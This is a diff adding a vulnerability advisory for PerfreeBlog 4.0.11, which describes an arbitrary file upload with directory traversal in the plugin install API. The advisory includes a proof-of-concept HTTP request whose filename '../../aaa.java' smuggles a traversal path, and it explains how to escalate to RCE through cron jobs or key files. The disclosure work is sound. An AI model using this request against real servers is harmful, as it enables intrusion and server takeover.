@@ -1,0 +1,71 @@
+# Arbitrary File Upload Vulnerability in PerfreeBlog System
+
+## Official Website
+https://perfree.org.cn/
+
+## Download Link
+https://gitee.com/PerfreeBlog/PerfreeBlog
+
+
+## Vulnerability Description
+The PerfreeBlog system has an arbitrary file upload vulnerability, which allows uploading any file to the server and gaining server privileges.
+
+
+## Vulnerable Version
+Latest version 4.0.11
+
+
+## Vulnerability Principle
+The relevant code details are as follows:
+The code for uploading plugin files is as follows:
+![](./img/1.png)
+It first loads the uploaded plugin file into the temp directory.
+![](./img/2.png)
+Enter the `installPlugin` function.
+![](./img/4.png)
+Enter the `extractZipPlugin` function and find that it first decompresses the file. If the uploaded file is not a zip file, the decompression will fail, and the `del` function in the previous image will not be executed. As a result, the uploaded file will be saved in the temp directory. Moreover, directory traversal can be performed using `../`, leading to a file upload vulnerability and potential file overwriting.
+![](./img/5.png)
+
+
+## Vulnerability Reproduction
+First, log in to the background and navigate to Plugin Management.
+![](./img/3.png)
+
+Click "Upload File" and capture the packet.
+The interface is:
+```
+http://127.0.0.1:8086/api/auth/plugins/installPlugin
+```
+This interface allows uploading files with any suffix to the temp directory, and directory traversal can be performed using `../`.
+
+```
+POST /api/auth/plugins/installPlugin HTTP/1.1
+Host: 127.0.0.1:8086
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0
+Accept: */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate, br
+Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImlzcyI6InNlY3VyaXR5IiwiaWF0IjoxNzU1NzU1MDc5LCJhdWQiOiJzZWN1cml0eS1hbGwiLCJleHAiOjE3NTU3NjIyNzl9.azdp21oZS07AwDE6ktPN4Ke6jTLYPUNl1AgefyplPkI
+Content-Type: multipart/form-data; boundary=----geckoformboundary60799225bab841ffad0224b272f8ae53
+Content-Length: 233
+Origin: http://127.0.0.1:8086
+Connection: keep-alive
+Referer: http://127.0.0.1:8086/admin/plugin
+Cookie: 
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+
+------geckoformboundary60799225bab841ffad0224b272f8ae53
+Content-Disposition: form-data; name="file"; filename="../../aaa.java"
+Content-Type: text/plain
+
+111111111111111
+------geckoformboundary60799225bab841ffad0224b272f8ae53--
+```
+![](./img/6.png)
+Successfully uploaded to the target directory. It is also possible to overwrite existing Java files to achieve RCE, as shown in the following figure.
+![](./img/7.png)
+
+
+For Linux systems, it is possible to write cron jobs, public-private keys, etc., to gain server privileges.
